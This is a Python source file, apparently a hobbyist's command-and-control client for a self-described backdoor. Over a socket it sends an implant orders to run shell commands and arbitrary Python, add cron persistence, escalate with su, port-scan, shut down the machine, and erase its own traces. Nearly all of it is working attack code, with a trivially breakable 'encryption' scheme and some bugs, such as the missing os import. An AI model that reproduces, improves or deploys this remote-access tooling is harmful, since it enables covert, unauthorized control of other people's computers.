#!/usr/bin/env python
#FOR PYTHON 3
__version__ = '0.4'
import socket, random, cmd, argparse
from os import system

#Constants
IP = '127.0.0.1'
PORT = 6000
KEY = random.randrange(0, 2**12)#Picking encryption key
runmode = argparse.ArgumentParser(description='Get runmode')#Setting up argparse
runmode.add_argument('-a', '--active', action='store_true')
runmode.add_argument('-p', '--passive', action='store_true')
runmode.add_argument('-r', '--reactive', action='store_true')
MODE = vars(runmode.parse_args())#Turns into dict

# Things I learned:
# groups, os.getgroups(), id, whoami, os.getuid()
# ls -la filename sees permissions
# chmod section+permission filename
# add string as help as first line of function
# chmod u+x filename to use shebang line to run
# reactive backdoor by log checking
# wake up - reading logs - found 'codename' - exec codename func
# log stream | grep "codename"
# change modifiable to have action
# read about fft
# how to check if file exists on computer
# cron @reboot filetoexec


#The encryption algorithm takes a random number and multiplies all of
#the charachter's ASCII values by it. It gets the key to the other side
#by sending it squared.

def encode_with_key(string_to_encode, key=KEY):#Encrypting and decrypting
    'Encrypt a string with this algorithm.'
    list_of_numbers = ''
    for letter in string_to_encode:
        list_of_numbers += str(ord(letter)*key) + ' '
    return list_of_numbers.encode()

def decode_with_key(bytes_to_decode, key=KEY):
    'Decode a bytes message encrypted with this algorithm.'
    string_of_bytes = ''
    list_of_bytes = bytes_to_decode.decode('utf-8').split()
    for letter in list_of_bytes:
        string_of_bytes += chr(int(int(letter)//key))
    return string_of_bytes

class send_commands(cmd.Cmd):
    prompt = 'Enter command: '
    def cmdloop(self, client, system, key=KEY):
        self.key = key
        self.client = client
        self.system = system
        intro = None
        return cmd.Cmd.cmdloop(self, intro)
    def do_exit(self, arg):
        'Exit program.'
        message = encode_with_key('exit', self.key)
        length_of_msg = str(len(str(message)))
        length_of_msg = ('0' * (5-len(length_of_msg))) + str(length_of_msg)
        self.client.send(str(length_of_msg).encode())
        self.client.send(message)
        return True
    def do_loggedin(self, arg):
        'Get current logged in user.'
        message = encode_with_key('loggedin', self.key)
        length_of_msg = str(len(message))
        length_of_msg = ('0' * (5-len(length_of_msg))) + str(length_of_msg)
        print('length_of_msg', length_of_msg)
        self.client.send(str(length_of_msg).encode())
        self.client.send(message)
        length_of_msg = int(self.client.recv(5).decode('utf-8'))
        print(str(decode_with_key(self.client.recv(length_of_msg), self.key)))
    def do_WHOAMI(self, arg):
        'Get current logged in user.'
        message = encode_with_key('WHOAMI', self.key)
        length_of_msg = str(len(str(message)))
        length_of_msg = ('0' * (5-len(length_of_msg))) + str(length_of_msg)
        print('length_of_msg', length_of_msg)
        self.client.send(str(length_of_msg).encode())
        self.client.send(message)
        length_of_msg = int(self.client.recv(5).decode('utf-8'))
        print(str(decode_with_key(self.client.recv(length_of_msg), self.key)))
    def do_volume(self, arg):
        'Set volume.'
        if self.system == 'Darwin':
            message = encode_with_key('volume '+str(arg), self.key)
            length_of_msg = str(len(str(message)))
            length_of_msg = ('0' * (5-len(length_of_msg))) + str(length_of_msg)
            print('length_of_msg', length_of_msg)
            self.client.send(str(length_of_msg).encode())
            self.client.send(message)
        else:
            print('Action not available with {system}.'.format(system = self.system))
    def do_say(self, arg):
        'Announce a phrase on the server.'
        if self.system == 'Darwin':
            message = encode_with_key('say '+str(arg), self.key)
            length_of_msg = str(len(str(message)))
            length_of_msg = ('0' * (5-len(length_of_msg))) + str(length_of_msg)
            print('length_of_msg', length_of_msg)
            self.client.send(str(length_of_msg).encode())
            self.client.send(message)
        else:
            print('Action not available with {system}.'.format(system = self.system))
    def do_logout(self, arg):
        'Logout the other computer.'
        if self.system == 'Windows' or self.system == 'Darwin':
            message = encode_with_key('logout', self.key)
            length_of_msg = str(len(str(message)))
            length_of_msg = ('0' * (5-len(length_of_msg))) + str(length_of_msg)
            print('length_of_msg', length_of_msg)
            self.client.send(str(length_of_msg).encode())
            self.client.send(message)
        else:
            print('Action not available with {system}.'.format(system = self.system))
    def do_shutdown(self, arg):
        'Shutdown the other computer.'
        if self.system == 'Windows' or self.system == 'Darwin':
            message = encode_with_key('shutdown')
            length_of_msg = str(len(str(message)))
            length_of_msg = ('0' * (5-len(length_of_msg))) + str(length_of_msg)
            print('length_of_msg', length_of_msg)
            self.client.send(str(length_of_msg).encode())
            self.client.send(message)
        else:
            print('Action not available with {system}.'.format(system = self.system))
    def do_sleep(self, arg):
        'Sleep the other computer.'
        if self.system == 'Windows' or self.system == 'Darwin' or self.system == 'Linux':
            message = encode_with_key('sleep', self.key)
            length_of_msg = str(len(str(message)))
            length_of_msg = ('0' * (5-len(length_of_msg))) + str(length_of_msg)
            print('length_of_msg', length_of_msg)
            self.client.send(str(length_of_msg).encode())
            self.client.send(message)
        else:
            print('Action not available with {system}.'.format(system = self.system))
    def do_exec(self, arg):
        'Run python code on the other computer.'
        message = encode_with_key('exec '+str(arg), self.key)
        length_of_msg = str(len(str(message)))
        length_of_msg = ('0' * (5-len(length_of_msg))) + str(length_of_msg)
        print('length_of_msg', length_of_msg)
        self.client.send(str(length_of_msg).encode())
        self.client.send(message)
    def do_cmd(self, arg):
        'Run a command on the server.'
        message = encode_with_key('cmd '+str(arg), self.key)
        length_of_msg = str(len(str(message)))
        length_of_msg = ('0' * (5-len(length_of_msg))) + str(length_of_msg)
        print('length_of_msg', length_of_msg)
        self.client.send(str(length_of_msg).encode())
        self.client.send(message)
        length_of_msg = int(self.client.recv(5).decode('utf-8'))
        print(str(decode_with_key(self.client.recv(length_of_msg), self.key)))
    def do_pers(self, arg):
        'Set file to run on boot (put in crontab).'
        message = encode_with_key('pers', self.key)
        length_of_msg = str(len(str(message)))
        length_of_msg = ('0' * (5-len(length_of_msg))) + str(length_of_msg)
        print('length_of_msg', length_of_msg)
        self.client.send(str(length_of_msg).encode())
        self.client.send(message)
        length_of_msg = int(self.client.recv(5).decode('utf-8'))
        print(str(decode_with_key(self.client.recv(length_of_msg), self.key)))
    def do_portscan(self, arg):
        'Scan ports set as range or as number. If none provided, will scan for well known ports. This may take a while.'
        message = encode_with_key('portscan ' + str(arg), self.key)
        length_of_msg = str(len(str(message)))
        length_of_msg = ('0' * (5-len(length_of_msg))) + str(length_of_msg)
        print('length_of_msg', length_of_msg)
        self.client.send(str(length_of_msg).encode())
        self.client.send(message)
        length_of_msg = int(self.client.recv(5).decode('utf-8'))
        print(str(decode_with_key(self.client.recv(length_of_msg), self.key)))
    def do_admin(self, arg):
        'Check if server account is admin.'
        if self.system == 'Darwin' or self.system == 'Linux':
            message = encode_with_key('admin', self.key)
            length_of_msg = str(len(str(message)))
            length_of_msg = ('0' * (5-len(length_of_msg))) + str(length_of_msg)
            print('length_of_msg', length_of_msg)
            self.client.send(str(length_of_msg).encode())
            self.client.send(message)
            length_of_msg = int(self.client.recv(5).decode('utf-8'))
            print(str(decode_with_key(self.client.recv(length_of_msg), self.key)))
        else:
            print('Action not available with {system}.'.format(system = self.system))
    def do_su(self, arg):
        'Get root access if server account is admin. Enter password after "su".'
        if self.system == 'Darwin' or self.system == 'Linux':
            message = encode_with_key('su ' + str(arg), self.key)
            length_of_msg = str(len(str(message)))
            length_of_msg = ('0' * (5-len(length_of_msg))) + str(length_of_msg)
            print('length_of_msg', length_of_msg)
            self.client.send(str(length_of_msg).encode())
            self.client.send(message)
        else:
            print('Action not available with {system}.'.format(system = self.system))
    def do_system(self, arg):
        'Get the server kernel os.'
        message = encode_with_key('system', self.key)
        length_of_msg = str(len(str(message)))
        length_of_msg = ('0' * (5-len(length_of_msg))) + str(length_of_msg)
        print('length_of_msg', length_of_msg)
        self.client.send(str(length_of_msg).encode())
        self.client.send(message)
        length_of_msg = int(self.client.recv(5).decode('utf-8'))
        print(str(decode_with_key(self.client.recv(length_of_msg), self.key)))
    def do_uname(self, arg):
        'Get machine info: node, platform, processor, system version, and other info.'
        message = encode_with_key('uname '+str(arg), self.key)
        length_of_msg = str(len(str(message)))
        length_of_msg = ('0' * (5-len(length_of_msg))) + str(length_of_msg)
        print('length_of_msg', length_of_msg)
        self.client.send(str(length_of_msg).encode())
        self.client.send(message)
        length_of_msg = int(self.client.recv(5).decode('utf-8'))
        print(str(decode_with_key(self.client.recv(length_of_msg), self.key)))
    def do_killattack(self, arg):
        'Erase all backdoor files on serverside.'
        print('Are you sure you want to erase all backdoor files on the serverside?')
        erase = input('There is no going back. Write y or n. ')
        if erase == 'y':
            message = encode_with_key('killattack', self.key)
            length_of_msg = str(len(str(message)))
            length_of_msg = ('0' * (5-len(length_of_msg))) + str(length_of_msg)
            print('length_of_msg', length_of_msg)
            self.client.send(str(length_of_msg).encode())
            self.client.send(message)
            return True

def main():
    'Main function'

    print(MODE)

    #Setting up socket
    if MODE['active'] == True and MODE['passive'] == True:
        print('Not a valid input')
        raise SystemExit
    elif MODE['reactive'] == True:
        while True:
            what_type = input('Run a command or a python script? type cmd or exec (or exit to stop): ')
            if what_type == 'exit':
                break
            what_to_run = input('Paste it in here:\n')
            os.system('ssh {cmd}@{ip}'.format(cmd= 'runreactive-'+what_type+'-'+what_to_run, ip=IP))
    elif MODE['passive'] == True:
        connect = socket.socket()
        connect.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)#To not get Errno [48] port in use
        connect.bind((IP, PORT))
        connect.listen(1)
        client, addr = connect.accept()
        print('accepted')
    else:
        client = socket.socket()
        try:
            client.connect((IP, PORT))
        except Exception as e:
            print('Connection Failed: {}'.format(e))
            raise SystemExit

    if MODE['reactive'] == False:
        print('key', KEY)
        length_of_msg = str(len(str(KEY**2).encode()))
        length_of_msg = ('0' * (2-len(length_of_msg))) + str(length_of_msg)
        client.send(str(length_of_msg).encode())
        client.send(str(KEY**2).encode())#Multiplying key for security
        length_of_msg = int(client.recv(2).decode('utf-8'))
        system = str(client.recv(length_of_msg).decode('utf-8'))
        print('You are connecting to a computer running the {kernel} operating system.'.format(kernel = system))
        commands = send_commands()
        commands.cmdloop(client, system)
        client.close()

if __name__ == '__main__':
    main()
